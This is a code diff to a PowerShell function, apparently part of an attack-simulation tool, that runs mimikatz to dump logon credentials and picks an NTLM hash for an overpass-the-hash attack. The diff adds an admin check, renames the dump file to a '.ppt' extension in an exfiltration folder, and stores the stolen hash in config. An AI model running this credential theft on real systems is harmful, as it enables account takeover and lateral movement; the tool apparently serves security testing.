@@ -61,6 +61,7 @@ function Invoke-OverPassTheHashAttack {
 
         $message = @"
 Please confirm that the following prerequisites are met in the isolated test environment:
+  • Run as Administrator
   • Credential Guard is not running on the victim PC.
   • LSASS is not running as a protected process (PPL).
   • The credential-extraction tool will run with elevated administrator privileges.
@@ -92,6 +93,14 @@ Please confirm that the following prerequisites are met in the isolated test env
 
         if ($decision -eq $Script:No) {
             Measure-FunctionRuntime -End -Details $Info
+            return
+        }
+
+
+        $result = Test-LocalAdministrator
+        if (-not $result.IsElevated) {
+            Write-AS2GoOutput -Type Error -Message "This function must be run as Administrator."
+            pause
             return
         }
 
@@ -185,7 +194,7 @@ Please confirm that the following prerequisites are met in the isolated test env
     
 
         $name = get-date -Format 'yyyyMMddhhmmss'
-        $CredentialDump = "$($Script:DefautExfiltrationFolder)\$name.log"
+        $CredentialDump = "$($Script:DefautExfiltrationFolder)\$name.ppt"
 
         Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe"  `
                 "log $CredentialDump" `
@@ -238,9 +247,7 @@ Please confirm that the following prerequisites are met in the isolated test env
             }
         }
 
-
-
-        
+       
         Write-AS2GoOutput -Type H1 -Message "All Principals."
         $BestResults  | Select-Object Domain, Username, NTLM, GroupMembershipRids | out-host
 
@@ -263,7 +270,8 @@ Please confirm that the following prerequisites are met in the isolated test env
         $title = "Select an account for the next step. The recommended account is preselected."
         $message = "Review the group memberships before proceeding. Use Help to see details for the selected account."
         $options = @(New-Helpoptions -InputObject $BestResults -Label 'Username' -Help 'GroupMembership' -Value "IndexOf" -AddSkip)
-        $index = [array]::IndexOf($BestResults, $BestPrincipal)
+        
+        $index = [array]::IndexOf(@($BestResults), $BestPrincipal)
 
         $SelectedIndex = Show-DecisionPrompt -Message $message -Options $Options -Default $index -Title $title
 
@@ -275,6 +283,10 @@ Please confirm that the following prerequisites are met in the isolated test env
         $Script:ASFQDN = $BestResults[$SelectedIndex].FQDN
         $Global:ASHelpDeskUser = $BestResults[$SelectedIndex].UserName
         $Script:ASPtHntml = $BestResults[$SelectedIndex].NTLM
+
+
+        Set-ASConfig -Setting "pthntml" -Value "$($Script:ASFQDN)|$($Global:ASHelpDeskUser)|$($Script:ASPtHntml)"
+
     
         Write-AS2GoOutput -Type Info -Message "Finished extracting logon sessions from $CredentialDump."
     }
